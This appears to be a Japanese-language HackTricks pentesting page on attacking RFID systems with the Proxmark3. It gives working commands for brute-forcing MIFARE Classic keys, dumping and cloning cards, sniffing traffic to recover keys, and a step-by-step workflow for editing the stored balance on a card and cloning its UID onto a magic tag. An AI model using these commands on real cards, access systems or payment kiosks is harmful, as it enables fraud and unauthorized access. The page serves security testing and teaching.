# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Proxmark3でRFIDシステムを攻撃する

最初に、[**Proxmark3**](https://proxmark.com)を用意し、[**ソフトウェアと依存関係をインストール**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)する必要があります。

### MIFARE Classic 1KBの攻撃

**16個のsector**があり、それぞれに**4個のblock**が存在し、各blockには**16B**が含まれています。UIDはsector 0のblock 0にあり（変更できません）。\
各sectorにアクセスするには、**2つのkey**（**A**と**B**）が必要です。これらは各sectorの**block 3**（sector trailer）に保存されています。sector trailerには、2つのkeyを使用して**各blockの読み取りおよび書き込み**権限を与える**access bits**も保存されています。\
例えば、1つ目のkeyを知っていれば読み取り、2つ目のkeyを知っていれば書き込みの権限を与えるために、2つのkeyが役立ちます。

複数の攻撃を実行できます。
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
The Proxmark3では、**Tag to Reader communication**を**eavesdropping**して機密データを探すなど、ほかの操作も実行できます。このカードでは、**cryptographic operations used are weak**であり、平文と暗号文が分かれば使用されたkeyを計算できる（`mfkey64` tool）ため、通信をsniffしてkeyを計算できます。<sup>[[3]](#references)</sup>

#### MiFare Classicのstored-value abuseにおける簡易ワークフロー

端末がClassicカードに残高を保存する場合、一般的なend-to-end flowは次のとおりです。<sup>[[4]](#references)</sup>
```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```
ノート

- `hf mf autopwn` は nested/darkside/HardNested-style attacks をオーケストレーションし、keys を復元して、client dumps folder に dumps を作成します。<sup>[[1]](#references)</sup>
- block 0/UID の書き込みは magic gen1a/gen2 cards でのみ機能します。Normal Classic cards の UID は read-only です。<sup>[[2]](#references)</sup>
- 多くの deployment では Classic の "value blocks" や単純な checksums が使用されています。編集後は、重複フィールド、補完フィールド、checksums がすべて整合していることを確認してください。<sup>[[4]](#references)</sup>

より高レベルな methodology と mitigations については、以下を参照してください。

{{#ref}}
pentesting-rfid.md
{{#endref}}

### Raw Commands

IoT systems では、**nonbranded または noncommercial tags** が使用されることがあります。この場合、Proxmark3 を使用して **tags に custom な raw commands を送信**できます。
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
この情報を使えば、カードに関する情報や、カードとの通信方法を検索できます。Proxmark3では、次のように raw commands を送信できます: `hf 14a raw -p -b 7 26`

### Scripts

Proxmark3 software には、簡単なタスクを実行するために使用できる **automation scripts** の事前読み込みリストが付属しています。完全なリストを取得するには、`script list` command を使用します。次に、`script run` command の後に script の名前を指定します:
```
proxmark3> script run mfkeys
```
**tag readers を fuzz**する script を作成できます。**valid card**のデータをコピーしたら、1つ以上のランダムな**bytes**を**randomize**し、各 iteration で**reader が crash するか**を確認する**Lua script**を書くだけです。

## References

- [1] [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [MIFARE Classic Crypto1 に関する NXP の声明](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [KioSoft Stored Value における NFC card の脆弱性 exploitation（SEC Consult）](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)

{{#include ../../banners/hacktricks-training.md}}
